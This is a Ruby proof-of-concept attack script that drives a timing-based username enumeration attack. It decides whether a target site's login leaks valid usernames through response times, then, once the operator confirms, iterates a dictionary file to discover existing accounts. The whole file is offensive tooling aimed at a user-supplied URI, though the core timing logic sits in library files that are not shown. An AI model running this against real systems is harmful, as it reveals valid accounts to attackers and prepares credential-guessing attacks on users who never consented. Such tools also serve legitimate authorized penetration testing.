require './lib/constants'
require './lib/options'
require './lib/request'
require './lib/attack'

#
# This is a PoC script that uses basic response-time analysis to determine
# whether a particular function is vulnerable to username enumeration, and if
# so, attempts to exploit it.
#
# Author: John Poulin (john.m.poulin@gmail.com)
# 

# Parse options and make sure things are valid
opts = Options.new
opts.parse(ARGV)

unless opts.valid?
	puts "!! Error: Options provided are invalid"
	exit
end

# Step One:    
# =>  Determine whether the host is vulnerable or not:
# =>    If we have valid username, then
# =>      send THRESHOLD requests with valid username
# =>      send THRESHOLD requests with invalid username
# =>      compare response time average
# =>      If valid_average > invalid_average +- MARGIN, then
# =>        Appears vulnerable
# =>        exploitable = true
# =>      else
# =>        Probably Not Vuln, but try again
# =>    Else
# =>      Proceed to step Two with less confidence
if opts.valid_username
  attack = Attack.new(DETERMINE_EXPLOITABLE,opts)

  attack.start
  if attack.is_exploitable
  	puts "Site appears to be exploitable"
  else
  	puts "Site may not be vulnerable"
  end
else
  exploitable = LOW_CONFIDENCE
  puts "Site may not be vulnerable"
end

# Step Two: Exploitation
# =>  Iterate over dictionary file
# =>    Send login request with provided username THRESHOLD times
# =>      compute average response time
# =>      if exploitable && unknown_avg_response_time >= valid_average +- MARGIN
# =>        Mark username as found
# =>      else if unknown_avg_response_time >= valid_average +- MARGIN
# =>        Not sure yet
# =>      end
# =>    end
# =>  end
# =>  Return valid username array
print "Would you like to attempt to exploit #{opts.uri} (y/n)?"
answer = gets.chomp

if answer.downcase == "y"
  print "Before we continue please enter new value for margin (#{opts.margin}ms): "
  margin = gets.chomp

  unless margin.nil? || margin == ""
    opts.margin = margin.to_i
  end

  attack = Attack.new(EXPLOIT, opts)
	puts "Attempting to discover user accounts"
	attack.exploit

  if attack.discovered_accounts.count == 0
    puts "No accounts have been discovered"
  end
end
 